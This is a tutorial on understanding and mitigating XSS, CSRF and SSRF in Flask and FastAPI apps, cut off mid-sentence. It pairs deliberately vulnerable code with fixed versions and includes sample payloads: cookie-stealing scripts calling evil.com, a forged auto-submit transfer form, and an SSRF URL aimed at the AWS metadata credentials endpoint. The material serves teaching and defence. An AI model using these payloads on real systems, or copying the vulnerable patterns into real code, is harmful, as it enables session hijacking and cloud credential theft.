XSS, CSRF, and SSRF: Understanding and Mitigating

Intuition

Think of these three vulnerabilities like different ways to abuse a restaurant. XSS is like slipping a note into the suggestion box that, when the manager reads it aloud, tricks other customers into handing over their wallets. CSRF is like forging a signed order slip — the waiter recognizes the customer's handwriting (cookie) and processes it without confirming directly. SSRF is like calling the restaurant's internal phone line by tricking the receptionist into dialing it for you — you cannot reach the kitchen directly, but you can ask someone inside to make the call.

XSS, CSRF, and SSRF: Understanding and Mitigating

Web application security vulnerabilities remain among the most exploited attack vectors in modern software. Three of the most critical — Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and Server-Side Request Forgery (SSRF) — each exploit different trust relationships in web architectures. Understanding these vulnerabilities deeply is essential for any backend engineer building production systems.

Cross-Site Scripting (XSS)

XSS occurs when an attacker injects malicious scripts into content that is served to other users. The browser trusts the content because it appears to come from a legitimate origin. XSS exploits the trust a user has in a website.

Type 1: Reflected XSS

Reflected XSS happens when user input is immediately reflected back in the HTTP response without proper sanitization. The malicious payload is typically delivered via a crafted URL.

Vulnerable Flask Example:

from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # VULNERABLE: User input directly embedded in HTML response
    return f'<html><body><h1>Search results for: {query}</h1></body></html>'

An attacker crafts a URL like:

https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

When a victim clicks this link, the script executes in their browser context, sending their session cookies to the attacker's server.

Mitigated Version:

from flask import Flask, request
from markupsafe import escape

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # SAFE: HTML entities are escaped
    return f'<html><body><h1>Search results for: {escape(query)}</h1></body></html>'

The escape() function converts < to &lt;, > to &gt;, " to &quot;, and so on, neutralizing any injected HTML or script tags.

Type 2: Stored XSS

Stored (or persistent) XSS is far more dangerous. The malicious payload is saved to the server's database and served to every user who views the affected page. Think of a forum post, a user profile bio, or a comment section.

Vulnerable Example — A comment system:

from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('app.db')
    return conn

@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.form.get('comment', '')
    db = get_db()
    # Stored directly — no sanitization
    db.execute('INSERT INTO comments (body) VALUES (?)', (comment,))
    db.commit()
    return 'Comment posted!'

@app.route('/comments')
def show_comments():
    db = get_db()
    comments = db.execute('SELECT body FROM comments').fetchall()
    html = '<html><body><h1>Comments</h1>'
    for (body,) in comments:
        # VULNERABLE: Raw user content rendered as HTML
        html += f'<div class="comment">{body}</div>'
    html += '</body></html>'
    return html

An attacker posts a comment containing <script>fetch('https://evil.com/log?c='+document.cookie)</script>. Every user who visits the comments page has their cookies exfiltrated.

Mitigated Version:

from markupsafe import escape
import bleach

@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.form.get('comment', '')
    # Sanitize on input: allow only safe HTML tags
    clean_comment = bleach.clean(
        comment,
        tags=['b', 'i', 'em', 'strong', 'a', 'p'],
        attributes={'a': ['href']},
        protocols=['https']
    )
    db = get_db()
    db.execute('INSERT INTO comments (body) VALUES (?)', (clean_comment,))
    db.commit()
    return 'Comment posted!'

@app.route('/comments')
def show_comments():
    db = get_db()
    comments = db.execute('SELECT body FROM comments').fetchall()
    html = '<html><body><h1>Comments</h1>'
    for (body,) in comments:
        # Already sanitized on input, but escape as defense-in-depth
        # if you don't need any HTML rendering:
        html += f'<div class="comment">{escape(body)}</div>'
    html += '</body></html>'
    return html

The best practice is defense in depth: sanitize on input AND escape on output. Use a library like bleach to allowlist specific HTML tags if rich text is needed.

Type 3: DOM-Based XSS

DOM-based XSS is unique because the vulnerability exists entirely in client-side JavaScript. The server never sees the payload — it is processed by JavaScript running in the browser, often from URL fragments (#) or other client-side sources.

// VULNERABLE: Client-side code reads from URL fragment and inserts into DOM
const name = document.location.hash.substring(1);
document.getElementById('greeting').innerHTML = 'Hello, ' + name;

A URL like https://example.com/page#<img src=x onerror=alert(document.cookie)> triggers script execution entirely in the browser.

While this is primarily a frontend concern, backend engineers must understand it because: 1. Your APIs may return data that frontend code unsafely renders. 2. You should set proper security headers (covered below) that mitigate DOM-based XSS. 3. You should advocate for using textContent instead of innerHTML in code reviews.

Content-Security-Policy (CSP)

CSP is a powerful HTTP response header that tells the browser which sources of content are allowed. It is the strongest defense-in-depth mechanism against XSS.

from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def set_security_headers(response):
    # Only allow scripts from the same origin — no inline scripts
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "frame-ancestors 'none'; "
        "base-uri 'self'; "
        "form-action 'self'"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response

Key CSP directives: - script-src 'self' — Only allow scripts from your own domain. This blocks all inline scripts, which is the primary XSS vector. - frame-ancestors 'none' — Prevents your site from being embedded in iframes (clickjacking prevention). - base-uri 'self' — Prevents <base> tag injection that can redirect relative URLs.

For applications that need inline scripts, use nonces:

import secrets

@app.route('/page')
def page():
    nonce = secrets.token_hex(16)
    response = make_response(render_template('page.html', nonce=nonce))
    response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
    return response

In the template, only scripts with the matching nonce execute:

<script nonce="{{ nonce }}">console.log('This runs');</script>
<script>console.log('This is blocked');</script>

Cross-Site Request Forgery (CSRF)

CSRF exploits the trust a website has in a user's browser. If a user is authenticated on bank.com, their browser automatically sends cookies with every request to bank.com — even if that request originates from evil.com.

How CSRF Works

  1. User logs into bank.com and receives a session cookie.
  2. User visits evil.com (via phishing, ad, etc.).
  3. evil.com contains a hidden form that auto-submits:
<form action="https://bank.com/transfer" method="POST" id="attack">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('attack').submit();</script>
  1. The browser sends the request to bank.com with the user's session cookie attached.
  2. bank.com processes the transfer because the request appears legitimate.

CSRF Token-Based Prevention

The standard defense is a CSRF token — a random, unpredictable value tied to the user's session that must be included in every state-changing request.

Flask implementation with Flask-WTF:

from flask import Flask, session, request, abort
from flask_wtf.csrf import CSRFProtect
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
csrf = CSRFProtect(app)

# Flask-WTF automatically:
# 1. Generates a CSRF token per session
# 2. Validates it on every POST/PUT/DELETE request
# 3. Returns 400 if the token is missing or invalid

@app.route('/transfer', methods=['POST'])
def transfer():
    # The CSRF token is automatically validated by Flask-WTF
    to_account = request.form['to']
    amount = request.form['amount']
    # Process transfer...
    return 'Transfer complete'

Manual CSRF protection for APIs (FastAPI):

from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import JSONResponse
import secrets
import hashlib

app = FastAPI()

# In-memory store (use Redis in production)
csrf_tokens: dict[str, str] = {}

def generate_csrf_token(session_id: str) -> str:
    token = secrets.token_hex(32)
    csrf_tokens[session_id] = token
    return token

def validate_csrf_token(request: Request):
    session_id = request.cookies.get('session_id')
    if not session_id:
        raise HTTPException(status_code=403, detail='No session')

    # Check the token from the header (common for API clients)
    token = request.headers.get('X-CSRF-Token')
    if not token or csrf_tokens.get(session_id) != token:
        raise HTTPException(status_code=403, detail='Invalid CSRF token')

@app.get('/api/csrf-token')
async def get_csrf_token(request: Request):
    session_id = request.cookies.get('session_id')
    token = generate_csrf_token(session_id)
    return {'csrf_token': token}

@app.post('/api/transfer', dependencies=[Depends(validate_csrf_token)])
async def transfer(request: Request):
    body = await request.json()
    # Process transfer...
    return {'status': 'success'}

SameSite Cookies

Modern browsers support the SameSite cookie attribute, which provides strong CSRF protection:

from flask import Flask, make_response

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    response = make_response('Logged in')
    response.set_cookie(
        'session_id',
        value='abc123',
        httponly=True,      # Prevents JavaScript access (mitigates XSS)
        secure=True,        # Only sent over HTTPS
        samesite='Lax',     # Sent on top-level navigations but NOT on cross-site POSTs
        max_age=3600
    )
    return response

SameSite values: - Strict — Cookie is never sent on cross-site requests. Most secure but breaks legitimate flows like clicking a link from email. - Lax — Cookie is sent on top-level GET navigations but NOT on cross-origin POST, PUT, DELETE, or AJAX. This is the default in modern browsers and blocks most CSRF attacks. - None — Cookie is always sent (requires Secure flag). Use only when cross-site cookie sharing is genuinely needed.

Best practice: Use SameSite=Lax as your baseline AND implement CSRF tokens as defense in depth. Older browsers may not support SameSite.

Server-Side Request Forgery (SSRF)

SSRF is fundamentally different from XSS and CSRF. It exploits the server itself, tricking it into making HTTP requests to unintended destinations — typically internal services, cloud metadata endpoints, or other infrastructure that is not accessible from the public internet.

Basic SSRF

Vulnerable Example — URL preview feature:

from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/preview')
def url_preview():
    url = request.args.get('url')
    # VULNERABLE: Server fetches any URL the user provides
    response = requests.get(url, timeout=5)
    return {
        'status': response.status_code,
        'content_length': len(response.content),
        'title': extract_title(response.text)
    }

An attacker calls:

https://example.com/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

This is the AWS EC2 instance metadata endpoint. The server — running inside AWS — can access it, even though the attacker cannot. The response leaks IAM credentials, potentially giving the attacker full access to your AWS account.

Cloud Metadata Attacks

Cloud providers expose metadata services at well-known addresses:

Provider Endpoint
AWS http://169.254.169.254/latest/meta-data/
GCP http://metadata.google.internal/computeMetadata/v1/
Azure http://169.254.169.254/metadata/instance

These endpoints return instance metadata, IAM credentials, API tokens, and other sensitive data. SSRF targeting these endpoints has been responsible for major breaches, including the 2019 Capital One breach.

DNS Rebinding

A sophisticated SSRF bypass technique. The attacker controls a domain that initially resolves to a public IP (passing validation) but then quickly changes to resolve to an internal IP like 127.0.0.1 or 169.254.169.254.

  1. Your server checks attacker.com — DNS resolves to 1.2.3.4 (public IP, passes validation).
  2. Your server makes the actual request — DNS TTL has expired, now resolves to 169.254.169.254.
  3. The request hits the internal metadata service.

Comprehensive SSRF Mitigation

import ipaddress
import socket
from urllib.parse import urlparse
from flask import Flask, request, abort
import requests

app = Flask(__name__)

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local (cloud metadata)
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('::1/128'),          # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
    ipaddress.ip_network('fe80::/10'),        # IPv6 link-local
]

ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_PORTS = {80, 443}

def is_safe_url(url: str) -> bool:
    """Validate a URL is safe to fetch, preventing SSRF."""
    try:
        parsed = urlparse(url)
    except Exception:
        return False

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False

    # Check port
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    if port not in ALLOWED_PORTS:
        return False

    hostname = parsed.hostname
    if not hostname:
        return False

    # Resolve DNS to get actual IP — this prevents DNS rebinding
    # by using the resolved IP for the actual request too
    try:
        addrinfos = socket.getaddrinfo(hostname, port)
    except socket.gaierror:
        return False

    for family, _, _, _, sockaddr in addrinfos:
        ip = ipaddress.ip_address(sockaddr[0])
        for blocked in BLOCKED_NETWORKS:
            if ip in blocked:
                return False

    return True

def safe_fetch(url: str, **kwargs) -> requests.Response:
    """Fetch a URL with SSRF protection."""
    if not is_safe_url(url):
        raise ValueError(f'URL blocked by security policy: {url}')

    # Resolve IP ourselves and connect directly to prevent DNS rebinding
    parsed = urlparse(url)
    hostname = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)

    addrinfos = socket.getaddrinfo(hostname, port)
    resolved_ip = addrinfos[0][4][0]

    # Replace hostname with resolved IP in the URL
    # but keep the original Host header for virtual hosting
    safe_url = url.replace(hostname, resolved_ip, 1)
    headers = kwargs.pop('headers', {})
    headers['Host'] = hostname

    return requests.get(
        safe_url,
        headers=headers,
        timeout=kwargs.get('timeout', 5),
        allow_redirects=False,  # Prevent redirect-based SSRF
        verify=True
    )

@app.route('/preview')
def url_preview():
    url = request.args.get('url', '')
    try:
        response = safe_fetch(url, timeout=5)
    except ValueError as e:
        abort(400, str(e))
    except requests.RequestException:
        abort(502, 'Failed to fetch URL')

    return {
        'status': response.status_code,
        'content_length': len(response.content)
    }

Key SSRF defenses explained:

  1. URL parsing and validation — Check scheme, port, and hostname before making any request.
  2. DNS resolution and IP validation — Resolve the hostname and check the IP against blocked networks BEFORE making the request.
  3. DNS rebinding prevention — Resolve DNS once and use the resolved IP for the actual connection. This closes the TOCTOU (Time of Check, Time of Use) window.
  4. Disable redirects — A redirect from a safe URL to http://169.254.169.254/ bypasses URL validation. Either disable redirects entirely or validate each redirect target.
  5. Network-level controls — Use firewall rules, VPC configurations, or IMDSv2 (which requires a PUT request with a hop limit header) as additional layers.

IMDSv2: AWS-Side Mitigation

AWS IMDSv2 requires a session token obtained via a PUT request with a TTL header. SSRF attacks that can only control GET requests cannot exploit IMDSv2:

# IMDSv2 requires two steps:
# Step 1: Get a token (PUT request with hop limit)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use the token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

Always enable IMDSv2 on your EC2 instances as defense in depth.

Putting It All Together: A Secure FastAPI Application

from fastapi import FastAPI, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

app = FastAPI()

# CORS: Restrict which origins can make requests
app.add_middleware(
    CORSMiddleware,
    allow_origins=['https://myapp.com'],  # NOT '*' in production
    allow_methods=['GET', 'POST', 'PUT', 'DELETE'],
    allow_headers=['Content-Type', 'X-CSRF-Token'],
    allow_credentials=True,
)

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        # XSS protection
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; script-src 'self'; "
            "frame-ancestors 'none'; base-uri 'self'"
        )
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        # CSRF protection via SameSite cookies is handled at cookie-setting time
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        return response

app.add_middleware(SecurityHeadersMiddleware)

Summary of Defense Strategies

Vulnerability Primary Defense Defense in Depth
Reflected XSS Output encoding/escaping CSP, input validation
Stored XSS Input sanitization + output encoding CSP with nonces, allowlisted HTML tags
DOM-based XSS Use textContent, avoid innerHTML CSP blocking inline scripts
CSRF CSRF tokens SameSite cookies, origin header checking
SSRF URL and IP validation Network-level controls, IMDSv2, disable redirects

The overarching principle is defense in depth. No single mitigation is sufficient on its own. Combine application-level validation, security headers, cookie attributes, and infrastructure-level controls. Assume each layer can fail and ensure the next layer catches the attack.

Common Problems & Solutions

1 CSRF tokens are rejected as invalid even though they were correctly generated and included in the form.
Symptoms: Users see 403 Forbidden errors when submitting forms. The issue is intermittent and seems to happen more frequently on high-traffic deployments.
Cause: CSRF tokens are stored in server-side sessions, but the application runs on multiple servers behind a load balancer without sticky sessions. The token is generated on server A but the form submission goes to server B, which has no record of the token.
Solution: Use a shared session store (Redis, database) accessible by all application servers, or switch to a stateless double-submit cookie pattern where the token is stored in both a cookie and a request parameter — the server validates that they match without needing server-side state.

Double-submit cookie pattern (stateless)

from fastapi import FastAPI, Request, HTTPException, Response import secrets, hmac

SECRET_KEY = 'your-server-secret'

@app.get('/api/csrf-token') async def get_csrf(response: Response): token = secrets.token_hex(32) signed = hmac.new(SECRET_KEY.encode(), token.encode(), 'sha256').hexdigest() response.set_cookie('csrf_token', f'{token}.{signed}', samesite='strict', httponly=True) return {'csrf_token': token}

async def validate_csrf(request: Request): cookie = request.cookies.get('csrf_token', '') header_token = request.headers.get('X-CSRF-Token', '') if '.' not in cookie: raise HTTPException(403) token, sig = cookie.rsplit('.', 1) expected = hmac.new(SECRET_KEY.encode(), token.encode(), 'sha256').hexdigest() if not hmac.compare_digest(sig, expected) or token != header_token: raise HTTPException(403)

2 Content-Security-Policy blocks legitimate inline scripts and styles, breaking the application's UI.
Symptoms: After deploying CSP headers, the browser console shows errors like 'Refused to execute inline script because it violates the following Content Security Policy directive: script-src self'. Parts of the page fail to render or interactive features stop working.
Cause: The CSP is correctly blocking inline scripts, but the application relies on inline
